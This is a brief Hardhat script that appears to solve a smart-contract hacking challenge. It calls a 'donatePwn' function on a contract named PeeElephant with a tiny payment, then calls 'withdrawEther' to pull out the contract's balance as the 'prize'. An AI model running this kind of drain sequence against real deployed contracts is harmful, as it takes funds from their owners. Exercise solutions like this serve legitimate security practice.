import { ethers } from "hardhat"
import { ADDRESSES, PLAYER } from "../consts"
import { getSigner } from "../utils"

async function pwn() {
    const signer = await getSigner()
    const contract = await ethers.getContractAt(
        "PeeElephant",
        ADDRESSES.peeElephant,
        signer
    )
    // const send = await signer?.sendTransaction({
    //     to: contract.address,
    //     from: PLAYER,
    //     value: ethers.utils.parseUnits("0.00069")
    // })
    const donate = await contract.donatePwn({
        value: ethers.utils.parseUnits("0.00000069", 18)
    })
    console.log("PWNING")
    const receipt = await donate?.wait()
    console.log(receipt)
    console.log("PWNED")
    console.log("CLAIMING PRIZE< GO TO TRUFFLE DASHBOARD")
    const prize = await signer?.provider?.getBalance(contract.address)
    const call = await contract.withdrawEther()
    const callReceipt = await call.wait()
    console.log("PRIZE CLAIMED")
    console.log(callReceipt.status)
}

pwn()